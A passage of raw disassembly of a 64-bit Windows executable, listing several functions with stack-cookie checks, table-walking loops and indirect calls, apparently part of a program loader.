   1400025c0:	4c 8b dc             	mov    %rsp,%r11
   1400025c3:	49 89 53 10          	mov    %rdx,0x10(%r11)
   1400025c7:	4d 89 43 18          	mov    %r8,0x18(%r11)
   1400025cb:	4d 89 4b 20          	mov    %r9,0x20(%r11)
   1400025cf:	53                   	push   %rbx
   1400025d0:	56                   	push   %rsi
   1400025d1:	57                   	push   %rdi
   1400025d2:	48 83 ec 70          	sub    $0x70,%rsp
   1400025d6:	48 8b 05 63 da 03 00 	mov    0x3da63(%rip),%rax        # 0x140040040
   1400025dd:	48 33 c4             	xor    %rsp,%rax
   1400025e0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400025e5:	48 8b da             	mov    %rdx,%rbx
   1400025e8:	49 8d 73 18          	lea    0x18(%r11),%rsi
   1400025ec:	48 8b f9             	mov    %rcx,%rdi
   1400025ef:	e8 4c ea ff ff       	call   0x140001040
   1400025f4:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400025f9:	4c 8b cb             	mov    %rbx,%r9
   1400025fc:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002602:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002609:	00 00 
   14000260b:	48 8b d7             	mov    %rdi,%rdx
   14000260e:	48 8b 08             	mov    (%rax),%rcx
   140002611:	48 83 c9 02          	or     $0x2,%rcx
   140002615:	e8 36 2e 01 00       	call   0x140015450
   14000261a:	85 c0                	test   %eax,%eax
   14000261c:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140002621:	0f 48 c1             	cmovs  %ecx,%eax
   140002624:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140002629:	7c 04                	jl     0x14000262f
   14000262b:	8b c1                	mov    %ecx,%eax
   14000262d:	eb 0d                	jmp    0x14000263c
   14000262f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002634:	48 8b cf             	mov    %rdi,%rcx
   140002637:	e8 08 41 01 00       	call   0x140016744
   14000263c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140002641:	48 33 cc             	xor    %rsp,%rcx
   140002644:	e8 57 8e 00 00       	call   0x14000b4a0
   140002649:	48 83 c4 70          	add    $0x70,%rsp
   14000264d:	5f                   	pop    %rdi
   14000264e:	5e                   	pop    %rsi
   14000264f:	5b                   	pop    %rbx
   140002650:	c3                   	ret
   140002651:	cc                   	int3
   140002652:	cc                   	int3
   140002653:	cc                   	int3
   140002654:	cc                   	int3
   140002655:	cc                   	int3
   140002656:	cc                   	int3
   140002657:	cc                   	int3
   140002658:	cc                   	int3
   140002659:	cc                   	int3
   14000265a:	cc                   	int3
   14000265b:	cc                   	int3
   14000265c:	cc                   	int3
   14000265d:	cc                   	int3
   14000265e:	cc                   	int3
   14000265f:	cc                   	int3
   140002660:	40 53                	rex push %rbx
   140002662:	48 83 ec 20          	sub    $0x20,%rsp
   140002666:	48 8b d9             	mov    %rcx,%rbx
   140002669:	e8 22 29 00 00       	call   0x140004f90
   14000266e:	85 c0                	test   %eax,%eax
   140002670:	75 3b                	jne    0x1400026ad
   140002672:	48 8b cb             	mov    %rbx,%rcx
   140002675:	c7 83 78 50 00 00 01 	movl   $0x1,0x5078(%rbx)
   14000267c:	00 00 00 
   14000267f:	e8 6c 2a 00 00       	call   0x1400050f0
   140002684:	85 c0                	test   %eax,%eax
   140002686:	75 25                	jne    0x1400026ad
   140002688:	48 8b cb             	mov    %rbx,%rcx
   14000268b:	e8 60 26 00 00       	call   0x140004cf0
   140002690:	85 c0                	test   %eax,%eax
   140002692:	75 19                	jne    0x1400026ad
   140002694:	48 8b cb             	mov    %rbx,%rcx
   140002697:	e8 c4 27 00 00       	call   0x140004e60
   14000269c:	85 c0                	test   %eax,%eax
   14000269e:	75 0d                	jne    0x1400026ad
   1400026a0:	48 8b cb             	mov    %rbx,%rcx
   1400026a3:	48 83 c4 20          	add    $0x20,%rsp
   1400026a7:	5b                   	pop    %rbx
   1400026a8:	e9 83 01 00 00       	jmp    0x140002830
   1400026ad:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400026b2:	48 83 c4 20          	add    $0x20,%rsp
   1400026b6:	5b                   	pop    %rbx
   1400026b7:	c3                   	ret
   1400026b8:	cc                   	int3
   1400026b9:	cc                   	int3
   1400026ba:	cc                   	int3
   1400026bb:	cc                   	int3
   1400026bc:	cc                   	int3
   1400026bd:	cc                   	int3
   1400026be:	cc                   	int3
   1400026bf:	cc                   	int3
   1400026c0:	4c 8b dc             	mov    %rsp,%r11
   1400026c3:	53                   	push   %rbx
   1400026c4:	56                   	push   %rsi
   1400026c5:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   1400026cc:	48 8b 05 6d d9 03 00 	mov    0x3d96d(%rip),%rax        # 0x140040040
   1400026d3:	48 33 c4             	xor    %rsp,%rax
   1400026d6:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   1400026dd:	00 
   1400026de:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   1400026e2:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400026e5:	0f 11 44 24 28       	movups %xmm0,0x28(%rsp)
   1400026ea:	33 c0                	xor    %eax,%eax
   1400026ec:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   1400026f0:	0f 11 44 24 38       	movups %xmm0,0x38(%rsp)
   1400026f5:	33 f6                	xor    %esi,%esi
   1400026f7:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   1400026fb:	48 8b ea             	mov    %rdx,%rbp
   1400026fe:	48 8b f9             	mov    %rcx,%rdi
   140002701:	0f 11 44 24 48       	movups %xmm0,0x48(%rsp)
   140002706:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   14000270b:	0f 11 44 24 68       	movups %xmm0,0x68(%rsp)
   140002710:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   140002715:	49 89 43 d0          	mov    %rax,-0x30(%r11)
   140002719:	41 0f 11 43 a0       	movups %xmm0,-0x60(%r11)
   14000271e:	41 0f 11 43 b0       	movups %xmm0,-0x50(%r11)
   140002723:	41 0f 11 43 c0       	movups %xmm0,-0x40(%r11)
   140002728:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000272d:	48 3b 59 10          	cmp    0x10(%rcx),%rbx
   140002731:	73 4e                	jae    0x140002781
   140002733:	4d 89 73 e8          	mov    %r14,-0x18(%r11)
   140002737:	41 be 01 01 10 40    	mov    $0x40100101,%r14d
   14000273d:	0f 1f 00             	nopl   (%rax)
   140002740:	0f b6 4b 11          	movzbl 0x11(%rbx),%ecx
   140002744:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140002747:	3c 1e                	cmp    $0x1e,%al
   140002749:	0f 87 80 00 00 00    	ja     0x1400027cf
   14000274f:	41 0f a3 c6          	bt     %eax,%r14d
   140002753:	73 7a                	jae    0x1400027cf
   140002755:	48 85 ed             	test   %rbp,%rbp
   140002758:	74 0b                	je     0x140002765
   14000275a:	48 8b d3             	mov    %rbx,%rdx
   14000275d:	48 8b cd             	mov    %rbp,%rcx
   140002760:	e8 8b 3a 00 00       	call   0x1400061f0
   140002765:	48 8b d3             	mov    %rbx,%rdx
   140002768:	48 8b cf             	mov    %rdi,%rcx
   14000276b:	e8 90 ef ff ff       	call   0x140001700
   140002770:	85 c0                	test   %eax,%eax
   140002772:	74 73                	je     0x1400027e7
   140002774:	be ff ff ff ff       	mov    $0xffffffff,%esi
   140002779:	4c 8b b4 24 d0 00 00 	mov    0xd0(%rsp),%r14
   140002780:	00 
   140002781:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140002786:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000278b:	48 8b bc 24 08 01 00 	mov    0x108(%rsp),%rdi
   140002792:	00 
   140002793:	48 8b ac 24 00 01 00 	mov    0x100(%rsp),%rbp
   14000279a:	00 
   14000279b:	48 85 c9             	test   %rcx,%rcx
   14000279e:	74 13                	je     0x1400027b3
   1400027a0:	e8 cb f6 ff ff       	call   0x140001e70
   1400027a5:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400027a9:	48 8b 4c dc 20       	mov    0x20(%rsp,%rbx,8),%rcx
   1400027ae:	48 85 c9             	test   %rcx,%rcx
   1400027b1:	75 ed                	jne    0x1400027a0
   1400027b3:	8b c6                	mov    %esi,%eax
   1400027b5:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   1400027bc:	00 
   1400027bd:	48 33 cc             	xor    %rsp,%rcx
   1400027c0:	e8 db 8c 00 00       	call   0x14000b4a0
   1400027c5:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   1400027cc:	5e                   	pop    %rsi
   1400027cd:	5b                   	pop    %rbx
   1400027ce:	c3                   	ret
   1400027cf:	80 f9 64             	cmp    $0x64,%cl
   1400027d2:	75 13                	jne    0x1400027e7
   1400027d4:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   1400027d8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400027dd:	e8 9e f9 ff ff       	call   0x140002180
   1400027e2:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400027e5:	74 8d                	je     0x140002774
   1400027e7:	48 8b d3             	mov    %rbx,%rdx
   1400027ea:	48 8b cf             	mov    %rdi,%rcx
   1400027ed:	e8 8e f2 ff ff       	call   0x140001a80
   1400027f2:	48 8b d8             	mov    %rax,%rbx
   1400027f5:	48 3b 47 10          	cmp    0x10(%rdi),%rax
   1400027f9:	0f 82 41 ff ff ff    	jb     0x140002740
   1400027ff:	e9 75 ff ff ff       	jmp    0x140002779
   140002804:	cc                   	int3
   140002805:	cc                   	int3
   140002806:	cc                   	int3
   140002807:	cc                   	int3
   140002808:	cc                   	int3
   140002809:	cc                   	int3
   14000280a:	cc                   	int3
   14000280b:	cc                   	int3
   14000280c:	cc                   	int3
   14000280d:	cc                   	int3
   14000280e:	cc                   	int3
   14000280f:	cc                   	int3
   140002810:	e9 6b 24 00 00       	jmp    0x140004c80
   140002815:	cc                   	int3
   140002816:	cc                   	int3
   140002817:	cc                   	int3
   140002818:	cc                   	int3
   140002819:	cc                   	int3
   14000281a:	cc                   	int3
   14000281b:	cc                   	int3
   14000281c:	cc                   	int3
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	c2 00 00             	ret    $0x0
   140002823:	cc                   	int3
   140002824:	cc                   	int3
   140002825:	cc                   	int3
   140002826:	cc                   	int3
   140002827:	cc                   	int3
   140002828:	cc                   	int3
   140002829:	cc                   	int3
   14000282a:	cc                   	int3
   14000282b:	cc                   	int3
   14000282c:	cc                   	int3
   14000282d:	cc                   	int3
   14000282e:	cc                   	int3
   14000282f:	cc                   	int3
   140002830:	40 53                	rex push %rbx
   140002832:	56                   	push   %rsi
   140002833:	41 57                	push   %r15
   140002835:	b8 50 10 00 00       	mov    $0x1050,%eax
   14000283a:	e8 01 8c 00 00       	call   0x14000b440
   14000283f:	48 2b e0             	sub    %rax,%rsp
   140002842:	48 8b 05 f7 d7 03 00 	mov    0x3d7f7(%rip),%rax        # 0x140040040
   140002849:	48 33 c4             	xor    %rsp,%rax
   14000284c:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   140002853:	00 
   140002854:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   140002858:	48 8b f1             	mov    %rcx,%rsi
   14000285b:	48 8b 05 46 e5 03 00 	mov    0x3e546(%rip),%rax        # 0x140040da8
   140002862:	48 8d 0d 6f b3 02 00 	lea    0x2b36f(%rip),%rcx        # 0x14002dbd8
   140002869:	ff 15 21 ab 02 00    	call   *0x2ab21(%rip)        # 0x14002d390
   14000286f:	4c 8b f8             	mov    %rax,%r15
   140002872:	48 85 c0             	test   %rax,%rax
   140002875:	75 15                	jne    0x14000288c
   140002877:	48 8d 0d 6a b3 02 00 	lea    0x2b36a(%rip),%rcx        # 0x14002dbe8
   14000287e:	e8 7d f7 ff ff       	call   0x140002000
   140002883:	41 8d 47 ff          	lea    -0x1(%r15),%eax
   140002887:	e9 7e 01 00 00       	jmp    0x140002a0a
   14000288c:	48 8b 05 45 e5 03 00 	mov    0x3e545(%rip),%rax        # 0x140040dd8
   140002893:	49 8b cf             	mov    %r15,%rcx
   140002896:	4c 89 a4 24 48 10 00 	mov    %r12,0x1048(%rsp)
   14000289d:	00 
   14000289e:	ff 15 ec aa 02 00    	call   *0x2aaec(%rip)        # 0x14002d390
   1400028a4:	4c 8b e0             	mov    %rax,%r12
   1400028a7:	48 85 c0             	test   %rax,%rax
   1400028aa:	75 16                	jne    0x1400028c2
   1400028ac:	48 8d 0d 55 b3 02 00 	lea    0x2b355(%rip),%rcx        # 0x14002dc08
   1400028b3:	e8 48 f7 ff ff       	call   0x140002000
   1400028b8:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   1400028bd:	e9 40 01 00 00       	jmp    0x140002a02
   1400028c2:	48 89 ac 24 78 10 00 	mov    %rbp,0x1078(%rsp)
   1400028c9:	00 
   1400028ca:	48 89 bc 24 80 10 00 	mov    %rdi,0x1080(%rsp)
   1400028d1:	00 
   1400028d2:	4c 89 b4 24 40 10 00 	mov    %r14,0x1040(%rsp)
   1400028d9:	00 
   1400028da:	48 3b 5e 10          	cmp    0x10(%rsi),%rbx
   1400028de:	0f 83 04 01 00 00    	jae    0x1400029e8
   1400028e4:	80 7b 11 73          	cmpb   $0x73,0x11(%rbx)
   1400028e8:	0f 85 e2 00 00 00    	jne    0x1400029d0
   1400028ee:	48 8b d3             	mov    %rbx,%rdx
   1400028f1:	48 8b ce             	mov    %rsi,%rcx
   1400028f4:	e8 97 ec ff ff       	call   0x140001590
   1400028f9:	4c 8d 73 12          	lea    0x12(%rbx),%r14
   1400028fd:	ba 00 10 00 00       	mov    $0x1000,%edx
   140002902:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002907:	4c 8d 8e 70 40 00 00 	lea    0x4070(%rsi),%r9
   14000290e:	4c 8d 05 1b b3 02 00 	lea    0x2b31b(%rip),%r8        # 0x14002dc30
   140002915:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   14000291c:	00 
   14000291d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002922:	48 8b e8             	mov    %rax,%rbp
   140002925:	e8 b6 f5 ff ff       	call   0x140001ee0
   14000292a:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000292f:	0f 8d 3a 01 00 00    	jge    0x140002a6f
   140002935:	48 8b 05 14 e5 03 00 	mov    0x3e514(%rip),%rax        # 0x140040e50
   14000293c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002941:	ff 15 49 aa 02 00    	call   *0x2aa49(%rip)        # 0x14002d390
   140002947:	48 8d 15 22 b3 02 00 	lea    0x2b322(%rip),%rdx        # 0x14002dc70
   14000294e:	49 8b cf             	mov    %r15,%rcx
   140002951:	48 8b f8             	mov    %rax,%rdi
   140002954:	4c 8b c0             	mov    %rax,%r8
   140002957:	48 8b 05 9a e4 03 00 	mov    0x3e49a(%rip),%rax        # 0x140040df8
   14000295e:	ff 15 2c aa 02 00    	call   *0x2aa2c(%rip)        # 0x14002d390
   140002964:	48 8b 05 9d e3 03 00 	mov    0x3e39d(%rip),%rax        # 0x140040d08
   14000296b:	48 8b cf             	mov    %rdi,%rcx
   14000296e:	ff 15 1c aa 02 00    	call   *0x2aa1c(%rip)        # 0x14002d390
   140002974:	8b 53 0c             	mov    0xc(%rbx),%edx
   140002977:	48 8b cd             	mov    %rbp,%rcx
   14000297a:	48 8b 05 47 e4 03 00 	mov    0x3e447(%rip),%rax        # 0x140040dc8
   140002981:	ff 15 09 aa 02 00    	call   *0x2aa09(%rip)        # 0x14002d390
   140002987:	48 8b f8             	mov    %rax,%rdi
   14000298a:	48 85 c0             	test   %rax,%rax
   14000298d:	0f 84 b6 00 00 00    	je     0x140002a49
   140002993:	4c 8b c0             	mov    %rax,%r8
   140002996:	48 8d 15 0b b3 02 00 	lea    0x2b30b(%rip),%rdx        # 0x14002dca8
   14000299d:	48 8b 05 54 e4 03 00 	mov    0x3e454(%rip),%rax        # 0x140040df8
   1400029a4:	49 8b cf             	mov    %r15,%rcx
   1400029a7:	ff 15 e3 a9 02 00    	call   *0x2a9e3(%rip)        # 0x14002d390
   1400029ad:	48 8b 05 ec e3 03 00 	mov    0x3e3ec(%rip),%rax        # 0x140040da0
   1400029b4:	4d 8b c4             	mov    %r12,%r8
   1400029b7:	49 8b d4             	mov    %r12,%rdx
   1400029ba:	48 8b cf             	mov    %rdi,%rcx
   1400029bd:	ff 15 cd a9 02 00    	call   *0x2a9cd(%rip)        # 0x14002d390
   1400029c3:	48 85 c0             	test   %rax,%rax
   1400029c6:	74 5e                	je     0x140002a26
   1400029c8:	48 8b cd             	mov    %rbp,%rcx
   1400029cb:	e8 38 2f 01 00       	call   0x140015908
   1400029d0:	48 8b d3             	mov    %rbx,%rdx
   1400029d3:	48 8b ce             	mov    %rsi,%rcx
   1400029d6:	e8 a5 f0 ff ff       	call   0x140001a80
   1400029db:	48 8b d8             	mov    %rax,%rbx
   1400029de:	48 3b 46 10          	cmp    0x10(%rsi),%rax
   1400029e2:	0f 82 fc fe ff ff    	jb     0x1400028e4
   1400029e8:	33 c0                	xor    %eax,%eax
   1400029ea:	48 8b ac 24 78 10 00 	mov    0x1078(%rsp),%rbp
   1400029f1:	00 
   1400029f2:	48 8b bc 24 80 10 00 	mov    0x1080(%rsp),%rdi
   1400029f9:	00 
   1400029fa:	4c 8b b4 24 40 10 00 	mov    0x1040(%rsp),%r14
   140002a01:	00 
   140002a02:	4c 8b a4 24 48 10 00 	mov    0x1048(%rsp),%r12
   140002a09:	00 
   140002a0a:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   140002a11:	00 
   140002a12:	48 33 cc             	xor    %rsp,%rcx
   140002a15:	e8 86 8a 00 00       	call   0x14000b4a0
   140002a1a:	48 81 c4 50 10 00 00 	add    $0x1050,%rsp
   140002a21:	41 5f                	pop    %r15
   140002a23:	5e                   	pop    %rsi
   140002a24:	5b                   	pop    %rbx
   140002a25:	c3                   	ret
   140002a26:	48 8b 05 63 e3 03 00 	mov    0x3e363(%rip),%rax        # 0x140040d90
   140002a2d:	ff 15 5d a9 02 00    	call   *0x2a95d(%rip)        # 0x14002d390
   140002a33:	49 8b d6             	mov    %r14,%rdx
   140002a36:	48 8d 0d 7b b2 02 00 	lea    0x2b27b(%rip),%rcx        # 0x14002dcb8
   140002a3d:	e8 be f5 ff ff       	call   0x140002000
   140002a42:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a47:	eb a1                	jmp    0x1400029ea
   140002a49:	49 8b d6             	mov    %r14,%rdx
   140002a4c:	48 8d 0d 2d b2 02 00 	lea    0x2b22d(%rip),%rcx        # 0x14002dc80
   140002a53:	e8 a8 f5 ff ff       	call   0x140002000
   140002a58:	48 8b 05 31 e3 03 00 	mov    0x3e331(%rip),%rax        # 0x140040d90
   140002a5f:	ff 15 2b a9 02 00    	call   *0x2a92b(%rip)        # 0x14002d390
   140002a65:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002a6a:	e9 7b ff ff ff       	jmp    0x1400029ea
   140002a6f:	48 8d 0d ca b1 02 00 	lea    0x2b1ca(%rip),%rcx        # 0x14002dc40
   140002a76:	e8 85 f5 ff ff       	call   0x140002000
   140002a7b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002a80:	e9 65 ff ff ff       	jmp    0x1400029ea
   140002a85:	cc                   	int3
   140002a86:	cc                   	int3
   140002a87:	cc                   	int3
   140002a88:	cc                   	int3
   140002a89:	cc                   	int3
   140002a8a:	cc                   	int3
   140002a8b:	cc                   	int3
   140002a8c:	cc                   	int3
   140002a8d:	cc                   	int3
   140002a8e:	cc                   	int3
   140002a8f:	cc                   	int3
   140002a90:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002a95:	55                   	push   %rbp
   140002a96:	56                   	push   %rsi
   140002a97:	57                   	push   %rdi
   140002a98:	41 54                	push   %r12
   140002a9a:	41 55                	push   %r13
   140002a9c:	41 56                	push   %r14
   140002a9e:	41 57                	push   %r15
   140002aa0:	48 8d ac 24 c0 c0 ff 	lea    -0x3f40(%rsp),%rbp
   140002aa7:	ff 
   140002aa8:	b8 40 40 00 00       	mov    $0x4040,%eax
   140002aad:	e8 8e 89 00 00       	call   0x14000b440
   140002ab2:	48 2b e0             	sub    %rax,%rsp
   140002ab5:	48 8b 05 84 d5 03 00 	mov    0x3d584(%rip),%rax        # 0x140040040
   140002abc:	48 33 c4             	xor    %rsp,%rax
   140002abf:	48 89 85 30 3f 00 00 	mov    %rax,0x3f30(%rbp)
   140002ac6:	44 8b e9             	mov    %ecx,%r13d
   140002ac9:	4c 8b e2             	mov    %rdx,%r12
   140002acc:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002ad1:	e8 aa 31 01 00       	call   0x140015c80
   140002ad6:	48 8b c8             	mov    %rax,%rcx
   140002ad9:	33 d2                	xor    %edx,%edx
   140002adb:	e8 70 3d 01 00       	call   0x140016850
   140002ae0:	e8 bb f3 ff ff       	call   0x140001ea0
   140002ae5:	48 8b f8             	mov    %rax,%rdi
   140002ae8:	48 85 c0             	test   %rax,%rax
   140002aeb:	0f 84 db 01 00 00    	je     0x140002ccc
   140002af1:	49 8b 14 24          	mov    (%r12),%rdx
   140002af5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002afa:	e8 91 05 00 00       	call   0x140003090
   140002aff:	85 c0                	test   %eax,%eax
   140002b01:	0f 84 c5 01 00 00    	je     0x140002ccc
   140002b07:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002b0c:	48 8d 8d 30 0f 00 00 	lea    0xf30(%rbp),%rcx
   140002b13:	e8 48 04 00 00       	call   0x140002f60
   140002b18:	85 c0                	test   %eax,%eax
   140002b1a:	0f 84 ac 01 00 00    	je     0x140002ccc
   140002b20:	48 8d 0d d1 b1 02 00 	lea    0x2b1d1(%rip),%rcx        # 0x14002dcf8
   140002b27:	e8 04 44 00 00       	call   0x140006f30
   140002b2c:	33 f6                	xor    %esi,%esi
   140002b2e:	4c 8b f0             	mov    %rax,%r14
   140002b31:	48 85 c0             	test   %rax,%rax
   140002b34:	44 8b fe             	mov    %esi,%r15d
   140002b37:	41 0f 95 c7          	setne  %r15b
   140002b3b:	48 85 c0             	test   %rax,%rax
   140002b3e:	74 40                	je     0x140002b80
   140002b40:	48 8d 0d c1 b1 02 00 	lea    0x2b1c1(%rip),%rcx        # 0x14002dd08
   140002b47:	e8 e4 43 00 00       	call   0x140006f30
   140002b4c:	48 85 c0             	test   %rax,%rax
   140002b4f:	74 2f                	je     0x140002b80
   140002b51:	0f b6 18             	movzbl (%rax),%ebx
   140002b54:	83 eb 31             	sub    $0x31,%ebx
   140002b57:	75 0a                	jne    0x140002b63
   140002b59:	0f b6 58 01          	movzbl 0x1(%rax),%ebx
   140002b5d:	40 0f b6 ce          	movzbl %sil,%ecx
   140002b61:	2b d9                	sub    %ecx,%ebx
   140002b63:	48 8b c8             	mov    %rax,%rcx
   140002b66:	e8 9d 2d 01 00       	call   0x140015908
   140002b6b:	48 8d 0d 96 b1 02 00 	lea    0x2b196(%rip),%rcx        # 0x14002dd08
   140002b72:	e8 99 48 00 00       	call   0x140007410
   140002b77:	85 db                	test   %ebx,%ebx
   140002b79:	41 0f 45 f7          	cmovne %r15d,%esi
   140002b7d:	44 8b fe             	mov    %esi,%r15d
   140002b80:	48 8d 0d 71 b1 02 00 	lea    0x2b171(%rip),%rcx        # 0x14002dcf8
   140002b87:	e8 84 48 00 00       	call   0x140007410
   140002b8c:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002b91:	48 8b cf             	mov    %rdi,%rcx
   140002b94:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002b99:	e8 02 f1 ff ff       	call   0x140001ca0
   140002b9e:	85 c0                	test   %eax,%eax
   140002ba0:	0f 85 ab 00 00 00    	jne    0x140002c51
   140002ba6:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002bab:	48 8b cf             	mov    %rdi,%rcx
   140002bae:	48 8d 95 30 0f 00 00 	lea    0xf30(%rbp),%rdx
   140002bb5:	e8 e6 f0 ff ff       	call   0x140001ca0
   140002bba:	85 c0                	test   %eax,%eax
   140002bbc:	75 1d                	jne    0x140002bdb
   140002bbe:	4c 8d 85 30 0f 00 00 	lea    0xf30(%rbp),%r8
   140002bc5:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002bca:	48 8d 0d 4f b1 02 00 	lea    0x2b14f(%rip),%rcx        # 0x14002dd20
   140002bd1:	e8 2a f4 ff ff       	call   0x140002000
   140002bd6:	e9 f1 00 00 00       	jmp    0x140002ccc
   140002bdb:	4d 85 f6             	test   %r14,%r14
   140002bde:	75 71                	jne    0x140002c51
   140002be0:	48 8d 15 cd ab 02 00 	lea    0x2abcd(%rip),%rdx        # 0x14002d7b4
   140002be7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002bec:	e8 ff 05 00 00       	call   0x1400031f0
   140002bf1:	48 8b d8             	mov    %rax,%rbx
   140002bf4:	48 85 c0             	test   %rax,%rax
   140002bf7:	75 05                	jne    0x140002bfe
   140002bf9:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140002bfc:	eb 3b                	jmp    0x140002c39
   140002bfe:	48 8b 05 23 ce 02 00 	mov    0x2ce23(%rip),%rax        # 0x14002fa28
   140002c05:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140002c0a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002c0f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002c15:	48 c1 e8 18          	shr    $0x18,%rax
   140002c19:	48 8b cb             	mov    %rbx,%rcx
   140002c1c:	04 0d                	add    $0xd,%al
   140002c1e:	88 44 24 2b          	mov    %al,0x2b(%rsp)
   140002c22:	e8 59 4a 00 00       	call   0x140007680
   140002c27:	48 85 c0             	test   %rax,%rax
   140002c2a:	75 25                	jne    0x140002c51
   140002c2c:	48 8b cb             	mov    %rbx,%rcx
   140002c2f:	e8 a8 d1 00 00       	call   0x14000fddc
   140002c34:	b8 01 00 00 00       	mov    $0x1,%eax
   140002c39:	44 8b c0             	mov    %eax,%r8d
   140002c3c:	48 8d 95 30 0f 00 00 	lea    0xf30(%rbp),%rdx
   140002c43:	48 8d 0d 26 b1 02 00 	lea    0x2b126(%rip),%rcx        # 0x14002dd70
   140002c4a:	e8 b1 f3 ff ff       	call   0x140002000
   140002c4f:	eb 7b                	jmp    0x140002ccc
   140002c51:	48 8d 15 50 b1 02 00 	lea    0x2b150(%rip),%rdx        # 0x14002dda8
   140002c58:	48 8b cf             	mov    %rdi,%rcx
   140002c5b:	e8 90 ed ff ff       	call   0x1400019f0
   140002c60:	48 8b f0             	mov    %rax,%rsi
   140002c63:	48 85 c0             	test   %rax,%rax
   140002c66:	74 32                	je     0x140002c9a
   140002c68:	48 8d 15 51 b1 02 00 	lea    0x2b151(%rip),%rdx        # 0x14002ddc0
   140002c6f:	48 8b c8             	mov    %rax,%rcx
   140002c72:	e8 19 3c 01 00       	call   0x140016890
   140002c77:	85 c0                	test   %eax,%eax
   140002c79:	75 07                	jne    0x140002c82
   140002c7b:	e8 20 51 00 00       	call   0x140007da0
   140002c80:	eb 18                	jmp    0x140002c9a
   140002c82:	48 8d 15 47 b1 02 00 	lea    0x2b147(%rip),%rdx        # 0x14002ddd0
   140002c89:	48 8b ce             	mov    %rsi,%rcx
   140002c8c:	e8 ff 3b 01 00       	call   0x140016890
   140002c91:	85 c0                	test   %eax,%eax
   140002c93:	75 05                	jne    0x140002c9a
   140002c95:	e8 56 53 00 00       	call   0x140007ff0
   140002c9a:	44 89 af 7c 50 00 00 	mov    %r13d,0x507c(%rdi)
   140002ca1:	4c 89 a7 80 50 00 00 	mov    %r12,0x5080(%rdi)
   140002ca8:	45 85 ff             	test   %r15d,%r15d
   140002cab:	75 5b                	jne    0x140002d08
   140002cad:	44 39 bf 70 50 00 00 	cmp    %r15d,0x5070(%rdi)
   140002cb4:	74 52                	je     0x140002d08
   140002cb6:	e8 35 51 00 00       	call   0x140007df0
   140002cbb:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002cbe:	75 3b                	jne    0x140002cfb
   140002cc0:	48 8d 0d 19 b1 02 00 	lea    0x2b119(%rip),%rcx        # 0x14002dde0
   140002cc7:	e8 34 f3 ff ff       	call   0x140002000
   140002ccc:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140002cd1:	48 8b 8d 30 3f 00 00 	mov    0x3f30(%rbp),%rcx
   140002cd8:	48 33 cc             	xor    %rsp,%rcx
   140002cdb:	e8 c0 87 00 00       	call   0x14000b4a0
   140002ce0:	48 8b 9c 24 90 40 00 	mov    0x4090(%rsp),%rbx
   140002ce7:	00 
   140002ce8:	48 81 c4 40 40 00 00 	add    $0x4040,%rsp
   140002cef:	41 5f                	pop    %r15
   140002cf1:	41 5e                	pop    %r14
   140002cf3:	41 5d                	pop    %r13
   140002cf5:	41 5c                	pop    %r12
   140002cf7:	5f                   	pop    %rdi
   140002cf8:	5e                   	pop    %rsi
   140002cf9:	5d                   	pop    %rbp
   140002cfa:	c3                   	ret
   140002cfb:	48 8b cf             	mov    %rdi,%rcx
   140002cfe:	e8 dd e7 ff ff       	call   0x1400014e0
   140002d03:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002d06:	74 c4                	je     0x140002ccc
   140002d08:	4d 85 f6             	test   %r14,%r14
